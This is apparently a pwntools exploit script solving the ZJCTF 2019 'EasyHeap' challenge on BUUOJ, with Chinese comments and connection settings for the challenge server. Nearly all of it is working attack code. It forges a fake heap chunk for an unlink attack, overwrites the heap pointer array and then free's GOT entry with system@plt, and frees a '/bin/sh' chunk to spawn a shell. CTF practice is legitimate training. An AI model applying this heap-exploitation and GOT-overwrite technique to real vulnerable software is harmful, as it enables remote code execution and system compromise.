'''
@Author       : 白银
@Date         : 2023-05-30 14:22:07
@LastEditors  : 白银
@LastEditTime : 2023-05-30 16:18:46
@FilePath     : /pwn/easyheap.py
@Description  : https://buuoj.cn/challenges#[ZJCTF%202019]EasyHeap
@Attention    : 
@Copyright (c) 2023 by 白银 captain-jparrow@qq.com, All Rights Reserved. 
'''

from pwn import *

set_arch = 0  # set_arch中，int，0→amd64，1→arm64，2→i386
pwnfile = './easyheap'  # pwnfile， str，二进制文件
if_remote = 1  # if_remote，int，1→远程，别的数字→本地
# 打本地，if_remote改别的数字就可以，最后两个参数随便改

# set_arch = 0
if set_arch == 0:
    context(log_level='debug', arch='amd64', os='linux')
elif set_arch == 1:
    context(log_level='debug', arch='arm64', os='linux')
elif set_arch == 2:
    context(log_level='debug', arch='i386', os='linux')
# pwnfile = './pwn1'
elf = ELF(pwnfile)
# if_remote = 0  # 0为远程
if if_remote == 1:
    # io = remote("192.190.61.139", 8888)
    # io = remote(remote_addr, remote_port)
    io = remote("node4.buuoj.cn", 27662)
    # libc = ELF('/home/jack/Desktop/libc.so.6')
    if set_arch == 0 or set_arch == 1:
        libc = ELF('/home/jack/Desktop/2.23x64libc.so.6')
    else:
        libc = ELF('/home/jack/Desktop/2.23x86libc.so.6')
else:
    io = process(pwnfile)
    # 本地用
    # elf = ELF(pwnfile)
    libc = elf.libc
    rop = ROP(pwnfile)
    # 本地调试用
    gdb.attach(io)
    pause()

def create(size, content):
    io.recvuntil("Your choice :")
    io.sendline(b"1")
    io.recvuntil("Size of Heap : ")
    io.sendline(str(size))
    io.recvuntil("Content of heap:")
    io.sendline(content)

def delete(idx):
    io.recvuntil("Your choice :")
    io.sendline(b"3")
    io.recvuntil("Index :")
    io.sendline(str(idx))

def edit(idx, size, content):
    io.recvuntil("Your choice :")
    io.sendline(b"2")
    io.recvuntil("Index :")
    io.sendline(str(idx))
    io.recvuntil("Size of Heap : ")
    io.sendline(str(size))
    io.recvuntil("Content of heap : ")
    io.sendline(content)

free_got = elf.got['free']
print("free_got------", hex(free_got))
system_plt = elf.plt['system']
print("system_plt------", hex(system_plt))
bin_sh = b'/bin/sh\x00'
heaparray_addr = 0x6020E0 # ida找到create_heap()函数的&heaparray地址

create(0x90, b'aaaa')
create(0x90, b'aaaa')
create(0x20, bin_sh)

# 构造fake chunk以及未被利用的空间
payload0 = flat([0, 0x91, heaparray_addr - 0x18, heaparray_addr-0x10])
payload1 = flat([payload0.ljust(0x90, b'a'), 0x90, 0xa0])

edit(0, 0x100, payload1)
delete(1)
payload2 = flat([0x0 , 0x0, 0x0, free_got]) # free表项所保存的地址的低三位为0
edit(0, 0x20, payload2)
payload3 = flat([system_plt])
edit(0, 8, payload3) # 第一个chunk的内容再修改为system地址
delete(2) # 触发free函数

io.interactive()